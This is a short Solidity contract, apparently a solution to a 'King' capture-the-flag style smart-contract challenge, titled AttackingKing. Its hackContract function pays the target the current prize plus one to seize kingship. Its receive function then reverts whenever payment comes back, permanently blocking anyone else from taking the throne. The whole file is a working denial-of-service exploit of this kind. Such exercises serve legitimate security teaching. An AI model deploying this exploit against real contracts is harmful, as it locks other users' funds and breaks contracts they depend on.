// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./King.sol";
import "hardhat/console.sol";

contract AttackingKing {
    address public contractAddress;

    constructor(address _contractAddress) payable {
        contractAddress = _contractAddress;
    }

    function hackContract() external {
        // Code me!
        uint prize = King(payable(contractAddress))._prize();
        (bool success, ) = payable(contractAddress).call{value: prize + 1}("");
        require(success, "Hack failed.");
    }

    receive() external payable {
        if (King(payable(contractAddress))._king() == address(this)) {
          revert("I am the king!");
        }
    }
}
